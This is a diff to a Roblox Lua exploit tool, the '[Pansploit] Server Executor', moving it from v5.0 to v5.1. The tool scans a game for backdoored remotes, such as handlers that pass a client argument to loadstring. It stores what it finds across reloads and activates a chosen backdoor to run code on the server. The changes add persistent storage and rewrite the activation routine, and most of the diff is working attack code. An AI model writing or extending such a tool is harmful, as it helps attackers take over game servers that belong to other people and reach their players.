@@ -17,8 +17,13 @@ _bs._guiStatusDot = nil
 _bs._guiStatusText = nil
 _bs._guiConsole = nil
 
+-- [FIXED] Persistent storage that survives reloads
 if not _G._pans_backdoor_storage then
-    _G._pans_backdoor_storage = {}
+    _G._pans_backdoor_storage = {
+        detectedBackdoors = {},  -- Store all detected backdoors
+        selectedPath = nil,
+        selectedType = nil
+    }
 end
 local _storage = _G._pans_backdoor_storage
 
@@ -158,8 +163,7 @@ local function _analyzeScript(scr)
         info.EntryPoint = {
             type = "RemoteEvent",
             remoteName = remoteName,
-            paramName = paramName,
-            fullPattern = "OnServerEvent:Connect(function(plr, " .. paramName .. ") loadstring(" .. paramName .. ")() end)"
+            paramName = paramName
         }
         table.insert(info.SuspiciousPatterns, "remote_event_direct_loadstring")
     end
@@ -470,7 +474,7 @@ local function _createGUI()
     titleText.Size = UDim2.new(1, -150, 1, 0)
     titleText.Position = UDim2.new(0, 15, 0, 0)
     titleText.BackgroundTransparency = 1
-    titleText.Text = "[Pansploit] Server Executor v5.0"
+    titleText.Text = "[Pansploit] Server Executor v5.1"
     titleText.TextColor3 = Color3.fromRGB(0, 200, 255)
     titleText.Font = Enum.Font.GothamBold
     titleText.TextSize = 16
@@ -750,7 +754,7 @@ local function _createGUI()
         screenGui.Enabled = false
     end)
     
-    _addConsoleLog("PanExecutor v5.0 loaded", "INFO")
+    _addConsoleLog("PanExecutor v5.1 loaded", "INFO")
     _addConsoleLog("Waiting for backdoor activation...", "INFO")
     
     _log("GUI Created successfully", "GUI")
@@ -892,6 +896,25 @@ end
 local function _findBackdoorByPath(path)
     if not path then return nil end
     
+    -- First check storage
+    if _storage.detectedBackdoors then
+        for _, bd in ipairs(_storage.detectedBackdoors) do
+            if bd.Path == path then
+                -- Reconstruct the backdoor entry
+                return {
+                    Path = bd.Path,
+                    Name = bd.Name,
+                    Type = bd.Type,
+                    Category = bd.Category,
+                    ExecutionMethod = bd.ExecutionMethod,
+                    Confidence = bd.Confidence,
+                    Object = nil -- Will be found dynamically
+                }
+            end
+        end
+    end
+    
+    -- Try to find in game
     local segments = {}
     for segment in string.gmatch(path, "[^%.]+") do
         table.insert(segments, segment)
@@ -1269,6 +1292,19 @@ function _bs.Scan()
         end
     end
     
+    -- [FIXED] Store in persistent storage
+    _storage.detectedBackdoors = {}
+    for _, m in ipairs(allMalicious) do
+        table.insert(_storage.detectedBackdoors, {
+            Path = m.Path,
+            Name = m.Name,
+            Type = m.Type,
+            Category = m.Category,
+            ExecutionMethod = m.ExecutionMethod,
+            Confidence = m.Confidence
+        })
+    end
+    
     if #allMalicious > 0 then
         local selected, backup = _selectRandomBackdoor(allMalicious)
         _bs._selected = selected
@@ -1312,7 +1348,7 @@ function _bs.Initialize(cb, cfg)
         _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
     end
     
-    _log("Initialized v5.0 (Manager + GUI + Console)", "INIT")
+    _log("Initialized v5.1 (Persistent Storage)", "INIT")
     return _bs
 end
 
@@ -1362,10 +1398,25 @@ function _bs.Disconnect()
     _log("Disconnected: " .. oldPath .. " (Type: " .. (oldType or "unknown") .. ")", "DISCONNECT")
 end
 
--- [MANAGER SUPPORT] Get all detected backdoors for manager selection
+-- [MANAGER SUPPORT] Get all detected backdoors from storage
 function _bs.GetAllDetected()
     local all = {}
     
+    -- Use persistent storage if available
+    if _storage.detectedBackdoors and #_storage.detectedBackdoors > 0 then
+        for _, bd in ipairs(_storage.detectedBackdoors) do
+            table.insert(all, {
+                Path = bd.Path,
+                Type = bd.Type,
+                ExecutionMethod = bd.ExecutionMethod,
+                Confidence = bd.Confidence,
+                Category = bd.Category
+            })
+        end
+        return all
+    end
+    
+    -- Fallback to current session
     for _, f in ipairs(_bs._f) do
         table.insert(all, {
             Path = f.Path,
@@ -1403,45 +1454,98 @@ function _bs.GetAllDetected()
     return all
 end
 
--- [MANAGER SUPPORT] Activate specific backdoor by path and category
+-- [MANAGER SUPPORT] Activate specific backdoor - FIXED
 function _bs.ActivateSpecific(path, category)
-    local toActivate = nil
+    _log("Attempting to activate: " .. path .. " [" .. category .. "]", "MANAGER")
     
-    for _, f in ipairs(_bs._f) do
-        if f.Path == path then
-            toActivate = f
-            _bs._selectedType = "function"
-            break
-        end
-    end
-    
-    if not toActivate then
-        for _, r in ipairs(_bs._r) do
-            if r.Path == path then
-                toActivate = r
-                if r.Category == "INFECTED_SCRIPT" then
-                    _bs._selectedType = "script"
-                else
-                    _bs._selectedType = "remote"
+    -- First check persistent storage
+    if _storage.detectedBackdoors then
+        for _, bd in ipairs(_storage.detectedBackdoors) do
+            if bd.Path == path then
+                -- Found in storage, now find the actual object in game
+                local obj = nil
+                local segments = {}
+                for segment in string.gmatch(path, "[^%.]+") do
+                    table.insert(segments, segment)
                 end
-                break
+                
+                local current = game
+                for i, segment in ipairs(segments) do
+                    if segment == "game" then
+                        current = game
+                    else
+                        local found = nil
+                        local children = {}
+                        pcall(function() children = current:GetChildren() end)
+                        
+                        for _, child in ipairs(children) do
+                            if child.Name == segment then
+                                found = child
+                                break
+                            end
+                        end
+                        
+                        if not found then
+                            local ok, svc = pcall(function() return game:GetService(segment) end)
+                            if ok and svc then
+                                found = svc
+                            end
+                        end
+                        
+                        if found then
+                            current = found
+                        else
+                            _log("Could not find segment: " .. segment, "ERROR")
+                            return false
+                        end
+                    end
+                end
+                
+                -- Verify it's valid
+                local isValid = pcall(function()
+                    return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
+                end)
+                
+                if isValid then
+                    _bs._selected = {
+                        Object = current,
+                        Name = current.Name,
+                        Type = current.ClassName,
+                        Path = path,
+                        Category = bd.Category,
+                        ExecutionMethod = bd.ExecutionMethod,
+                        Confidence = bd.Confidence
+                    }
+                    
+                    -- Determine type from category
+                    if bd.Category == "BACKDOORED_FUNC" then
+                        _bs._selectedType = "function"
+                    elseif bd.Category == "INFECTED_SCRIPT" then
+                        _bs._selectedType = "script"
+                    else
+                        _bs._selectedType = "remote"
+                    end
+                    
+                    _bs._a = true
+                    
+                    _storage.selectedPath = path
+                    _storage.selectedType = _bs._selectedType
+                    
+                    _startMonitoring()
+                    _startGameMonitoring()
+                    _createGUI()
+                    
+                    _log("Successfully activated: " .. path, "MANAGER")
+                    return true
+                else
+                    _log("Found object is not a valid remote", "ERROR")
+                    return false
+                end
             end
         end
     end
     
-    if toActivate then
-        _bs._selected = toActivate
-        _bs._a = true
-        
-        _startMonitoring()
-        _startGameMonitoring()
-        
-        _createGUI()
-        
-        _log("Activated specific: " .. path, "ACTIVE")
-        return true
-    end
-    
+    _log("Backdoor not found in storage: " .. path, "ERROR")
     return false
 end
 
@@ -1457,7 +1561,8 @@ function _bs.GetStatus()
         BackdooredFunctions = #_bs._f,
         ScanTime = tick() - _bs._s,
         CurrentGameId = _bs._currentGameId,
-        HasGUI = _bs._gui ~= nil
+        HasGUI = _bs._gui ~= nil,
+        StorageCount = _storage.detectedBackdoors and #_storage.detectedBackdoors or 0
     }
 end
 
